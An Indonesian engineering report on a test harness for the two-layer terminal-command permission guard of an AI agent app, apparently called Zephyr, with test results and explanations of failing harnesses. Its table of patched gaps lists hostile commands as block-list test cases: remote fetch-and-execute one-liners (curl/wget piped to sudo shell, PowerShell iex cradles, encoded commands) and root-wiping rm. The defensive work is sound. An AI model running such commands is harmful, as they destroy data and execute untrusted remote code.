# LAPORAN IZIN TERMINAL — harness, keadaan nyata, dan akar merah

Item: **V4V12-IZIN-TERMINAL-HARNESS** (lanjutan: tambalan produk untuk 8 celah)
Berkas harness utama: `scripts/cek-izin-terminal.mjs` (BARU, milik item ini)
Berkas agregator: `scripts/uji-izin-semua.mjs` (BARU, milik item ini)
Tanggal pengukuran: 2026-10-14, cabang `feat/ai-panel-vscode-layout`

---

## 1. Ringkasan

- Zephyr punya **dua lapis izin terminal**, dan keduanya nyata serta bisa diuji tanpa menghidupkan aplikasi:
  1. **LAPIS 1 — TOLAK keras.** `src/lib/agentGuard.ts` → `periksaPerintahShell()` (baris **272**),
     dipasang di `src/lib/zephyrTools/builtins.ts:508`.
  2. **LAPIS 2 — TANDAI lalu minta persetujuan.** `src/lib/aiStore.ts` → `isDestructive()`
     (baris **2393**) yang membaca daftar `DESTRUCTIVE` (baris **2336–2390**).
- `node scripts/cek-izin-terminal.mjs` → **LULUS, exit 0: 61 periksa, 61 lulus, 0 gagal, 0 celah, over-block 0, subproses 0x.**
  49 kasus uji: 20 bahaya + 9 tambalan + 14 jinak + 3 khusus + 3 terkutip.
- `npx tsc --noEmit` → **exit 0, 0 galat.**
- `node scripts/uji-izin-semua.mjs` → **exit 0** (14 harness wajib hijau + 1 butuh app semuanya hijau; 2 harness "dikenal merah" tetap merah sesuai analisis di bawah).
- Sisa merah **bukan** di lapis izin terminal: keduanya ditulis apa adanya di bagian 4.

---

## 2. Dua lapis izin terminal (bukti berkas + baris)

| Lapis | Berkas | Simbol | Baris | Sifat | Dipasang/dipakai di |
|---|---|---|---|---|---|
| L1 | `src/lib/agentGuard.ts` | `PERINTAH_BERBAHAYA` | 236–259 (14 pola) | TOLAK (hasil `ok:false`) | `periksaPerintahShell()` baris 272 |
| L1 | `src/lib/agentGuard.ts` | `periksaPerintahShell()` | 272 | TOLAK | `src/lib/zephyrTools/builtins.ts:508` |
| L1 | `src/lib/agentGuard.ts` | `POLA_RAHASIA` / `DIR_TERPROTEKSI` | 80–103 / 115–141 | pagar rahasia & folder | dipakai guard tool |
| L2 | `src/lib/aiStore.ts` | `DESTRUCTIVE` | 2336–2390 (40 pola) | TANDAI → minta approval | `isDestructive()` baris 2393 |
| L2 | `src/components/settings/CommandPermissions.tsx` | `isDestructive` dipakai | 37 | gate izin di Settings | UI persetujuan |

Pemanggil `isDestructive` (L2): `AiPanel.tsx:1203`, `ChatMessage.tsx:147`, `devBridge.ts:442`,
`subagentStore.ts:1042`, `subagentStore.ts:1301`, `settings/CommandPermissions.tsx:37`.

Penting: **lapis 1 tidak mengembalikan bidang `alasan` untuk keputusan TERIMA** (`{ok:true}` saja).
Karena itu harness mensintesis alasan untuk kasus lolos, dan mencatatnya apa adanya —
kalimat alasan yang muncul di keluaran berasal dari harness, bukan dari produk.

---

## 3. Harness izin yang ADA + keadaan nyatanya

Semua baris dijalankan ulang **setelah** tambalan produk (keluaran mentah di `…/scratch/izin/*.setelah.out`,
lihat bagian 6). Kolom "akar merah" = salah harness atau salah produk, dengan bukti berkas+baris.

| Harness | Butuh app? | Keadaan | Angka nyata | Akar merah (kalau merah) |
|---|---|---|---|---|
| `cek-izin-terminal.mjs` (BARU) | tidak | **HIJAU** | 61/61 lulus, 0 gagal, 0 celah | — |
| `uji-guard-listener.mjs` | tidak | **HIJAU** | SEMUA LULUS | — |
| `uji-aturan-tool.mjs` | tidak | **HIJAU** | 28/28 | — |
| `uji-ssh-aman.mjs` | tidak | **HIJAU** | 53/53 | — |
| `uji-ssh-rencana.mjs` | tidak | **HIJAU** | 26/26 | — |
| `uji-jadwal-rencana.mjs` | tidak | **HIJAU** | 25/25 | — |
| `cek-konteks-repo.mjs` | tidak | **HIJAU** | 43 lulus, 0 gagal | — |
| `uji-konteks-repo-adv.mjs` | tidak | **HIJAU** | 57/57 (mode ketat) | — |
| `uji-aturan-proyek.mjs` | tidak | **HIJAU** | 31/31 | — |
| `verify-tool-inti.mjs` | tidak | **HIJAU** | 6/6 | — |
| `uji-fetch-web-rencana.mjs` | tidak | **HIJAU** | rencana LULUS; 5 celah kode produk disebut dokumennya sendiri | — |
| `uji-trim-tool.mjs` | tidak | **HIJAU** | 15/15 | — |
| `cek-aturan-operasional.mjs` | tidak | **HIJAU** | 6/6 | — |
| `cek-subset-tugas.mjs` | tidak | **HIJAU** | semua kasus ≤20 tool | — |
| `uji-batas-tulis.mjs` | **ya (CDP 9223)** | **HIJAU** | 14/14 (app hidup) | — |
| `verify-tool-gate.mjs` | **ya (CDP 9223)** | **MERAH** (exit 1) | gagal di baris 21 | **DUA sebab** — (a) **harness + app**: `Cannot read properties of undefined (reading 'getState')` dari `scripts/lib-cdp.mjs:432`, dipicu `scripts/verify-tool-gate.mjs:21` (state aplikasi hidup tak ditemukan); (b) **harness salah-baca (belum tercapai)**: `scripts/verify-tool-gate.mjs:26` dan `:67` membaca `m.TOOL_DEFAULT`, padahal `src/lib/toolGate.ts` mengekspor **`TOOL_AKTIF_AWAL`** (baris 186) — tidak ada `TOOL_DEFAULT` di `src/` |
| `uji-kesiapan-tool.mjs` | tidak | **MERAH** (exit 1) | 4 dari 6 tugas = 23 tool > batas 20; 11 celah tercatat | **harness salah-sasaran**: `scripts/uji-kesiapan-tool.mjs:162` mengukur `subset.alatUntukTugas` (`src/lib/subsetAlat.ts:181–204`, memang **tanpa cap**), sedangkan kebijakan ≤20 ada di `BATAS_TOOL_TUGAS = 20` (`src/lib/subsetTugas.ts:61`) yang ditegakkan `subsetTugas.ts:638` & `:668` dan dipakai **jalur kirim** `src/lib/aiStore.ts:5909`; `alatUntukTugas` sejak `src/lib/devBridge.ts:339–353` hanya pembanding diagnostik ("lama" vs "kirim") |

Catatan: `verify-tool-gate.mjs` dan `uji-kesiapan-tool.mjs` **bukan** lapis izin terminal murni
(mereka soal daftar tool per giliran). Keduanya dimasukkan ke tabel sebagai **berdekatan** (adjacent),
dan keputusannya menunggu pemilik modul — lihat `docs/USULAN-IZIN-TERMINAL.md` bagian B6.

---

## 4. Riwayat 8 celah → kini tertambal (ringkas)

Versi pertama harness ini menemukan **8 celah produk** (keputusan L1 + L2 sama-sama meloloskannya):

| # | Perintah | Dulu | Sekarang | Pola penangkap |
|---|---|---|---|---|
| C01 | `powershell -enc SQBFAFgA` | lolos | ditolak | `agentGuard.ts:255` |
| C02 | `powershell -EncodedCommand SQBFAFgA` | lolos | ditolak | `agentGuard.ts:255` |
| C03 | `powershell -c "iex (iwr http://x.example)"` | lolos | ditolak | `agentGuard.ts:257` |
| C04 | `rm -r -f /` (flag terpisah) | lolos | ditolak | `agentGuard.ts:241` |
| C05 | `rm -rf /**` (glob akar) | lolos | ditolak | `agentGuard.ts:241` |
| C06 | `curl https://x.example \| sudo bash` | lolos | ditolak | `agentGuard.ts:253` |
| C07 | `wget -qO- https://x.example \| sudo sh` | lolos | ditolak | `agentGuard.ts:253` |
| C08 | `IEX (New-Object Net.WebClient).DownloadString(...)` | lolos | ditolak | `agentGuard.ts:257` |
| C09 | `powershell -c "iwr http://x.example \| iex"` (urutan terbalik) | (baru) | ditolak | `agentGuard.ts:258` |

C09 ditambahkan supaya pola `agentGuard.ts:258` tidak jadi kode mati.
**Tidak ada pemeriksaan yang dilonggarkan**: kelompok CELAH diubah menjadi kelompok **TAMBAL** yang
justru lebih ketat — setiap kasus wajib (a) ditolak dan (b) jejak nomor barisnya cocok dengan pola
yang diharapkan. Rincian teks lama/baru ada di `docs/USULAN-IZIN-TERMINAL.md` bagian A.

---

## 5. Angka nyata (keluaran `node scripts/cek-izin-terminal.mjs`, apa adanya)

```
== Ringkasan ==
pola lapis 1 dibaca  : 14 (src/lib/agentGuard.ts:236-259)
pola lapis 2 dibaca  : 40 (src/lib/aiStore.ts:2336-2390)
kasus diuji          : 49 (bahaya 20, tambal 9, jinak 14, khusus 3, terkutip 3)
bahaya ditolak L1    : 20/20
jinak dilolos L1     : 14/14
celah tersisa        : 0 (0 = semua tambalan berdiri)
- tak ditangkap KEDUA lapis: 0 (tidak ada)
over-block lapis 1   : 0
determinisme         : IDENTIK
subproses dijalankan : 0x (dibekukan)
periksa              : 61/61 lulus, 0 gagal
HASIL: LULUS (exit 0)
```

Tambahan yang diuji harness: alasan wajib ada pada setiap keputusan (49 keputusan, 32 penolakan berpola),
pola dibaca dari berkas nyata (14 pola L1 + 40 pola L2, semuanya di dalam blok deklarasinya),
blok `DESTRUCTIVE` kompil jadi RegExp, sumber guard murni (tanpa `child_process`/`exec`/`require`),
bundel yang benar-benar dijalankan juga murni, dan keluaran deterministik (dua jalankan IDENTIK).

---

## 6. Cara menjalankan + provenans

```bash
node scripts/cek-izin-terminal.mjs        # harness inti izin terminal (exit 0 = hijau)
node scripts/uji-izin-semua.mjs           # agregator seluruh harness izin
npx tsc --noEmit                          # 0 galat
```

Keluaran mentah hasil pengukuran disimpan di
`C:/Users/Zyrex/AppData/Local/hermes/cache/scratch/izin/` — antara lain
`cek-izin-terminal-setelah-tambal.out`, `uji-izin-semua.out`, `tsc-setelah-tambal.out`,
dan `<nama-harness>.setelah.out` untuk 17 harness yang dijalankan ulang.

Catatan kejujuran — pohon repo BERGERAK selama pengukuran (pekerja lain menyunting `src/`):

| Gejala yang terlihat | Sebab (bukan item ini) | Bukti |
|---|---|---|
| `tsc` sempat 4 galat TS6133 di `src/lib/zephyrTools/web.ts` | suntingan simultan pekerja lain | mtime `web.ts` 07:46:56 vs `agentGuard.ts` 07:39:29; setelah berkas itu selesai, `tsc` kembali 0 galat |
| `tsc` sempat 1 galat TS2304 `BATAS_BERKAS_PER_PANGGILAN` di `src/lib/bacaKode.ts:154` | berkas itu sedang setengah diedit (konstanta ada di baris 91 berkas yang sama) | mtime `bacaKode.ts` 07:55:26 (40 detik sebelum pengukuran); setelah tenang, `tsc` kembali 0 galat |
| `uji-batas-tulis` sempat MERAH 1x | Vite HMR me-RELOAD halaman di tengah uji — `timeout: halaman sepertinya RELOAD di tengah uji (slot … hilang)` (`lib-cdp.mjs:423`, dipicu `uji-batas-tulis.mjs:157`) | dijalankan ulang saat repo tenang → **14/14 lulus** |

Tidak satu pun dari tiga kejadian itu menyentuh `src/lib/agentGuard.ts` atau skrip item ini;
`npx tsc --noEmit` dan `uji-batas-tulis` sama-sama pulih begitu suntingan tetangga berhenti.

---

## 7. Keluaran agregator (apa adanya)

```
== uji-izin-semua ==
akar repo     : D:\Zephyr
aplikasi (9223): HIDUP
harness        : 14 wajib hijau + 1 butuh app + 2 dikenal merah

  OK    cek-izin-terminal       exit=0  HASIL: LULUS (exit 0)
  OK    uji-guard-listener      exit=0  SEMUA LULUS
  OK    uji-aturan-tool         exit=0  == 28/28 lulus ==
  OK    uji-ssh-aman            exit=0  == 53/53 lulus ==
  OK    uji-ssh-rencana         exit=0  == 26/26 lulus ==
  OK    uji-jadwal-rencana      exit=0  == 25/25 lulus ==
  OK    cek-konteks-repo        exit=0  HASIL: 43 lulus, 0 gagal
  OK    uji-konteks-repo-adv    exit=0  mode ketat: 0 celah dikenal dihitung GAGAL - tambal modulnya
  OK    uji-aturan-proyek       exit=0  == 31/31 lulus ==
  OK    verify-tool-inti        exit=0  == 6/6 lulus ==
  OK    uji-fetch-web-rencana   exit=0  HASIL: aturan RANCANGAN LULUS (exit 0). Ini TIDAK berarti kode produk sudah aman
  OK    uji-trim-tool           exit=0  == 15/15 lulus ==
  OK    cek-aturan-operasional  exit=0  == 6/6 lulus ==
  OK    cek-subset-tugas        exit=0  HASIL: LULUS - semua kasus <= 20 tool dan superset kemampuan
  OK    uji-batas-tulis         exit=0  == 14/14 lulus ==
  MERAH  verify-tool-gate        exit=1
        akar   : harness + app (DUA sebab) — gagal di baris 21: state CDP tak ditemukan (lib-cdp.mjs:432 getState);
                 baris 26 & 67 membaca m.TOOL_DEFAULT yang TIDAK diekspor (src/lib/toolGate.ts mengekspor TOOL_AKTIF_AWAL:186)
  MERAH  uji-kesiapan-tool       exit=1
        akar   : harness salah-sasaran — mengukur sub.alatUntukTugas (subsetAlat.ts:181-204, memang tanpa cap) lalu
                 menuntut <=20; cap <=20 ada di subsetTugas.ts:61 & ditegakkan :638/:668, dipakai jalur kirim
                 aiStore.ts:5909; alatUntukTugas sendiri cuma pembanding diagnostik (devBridge.ts:339-353)

== Ringkasan ==
harness wajib hijau yang merah : 0
butuh app tapi di-SKIP         : 0
dikenal-merah yang jadi hijau  : 0
total harness dijalankan       : 17
HASIL: LULUS (exit 0) — semua harness izin yang wajib hijau memang hijau.
```

Keluaran mentah disimpan di `…/scratch/izin/uji-izin-semua-final.out` dan `…/final-cek-izin.out`.
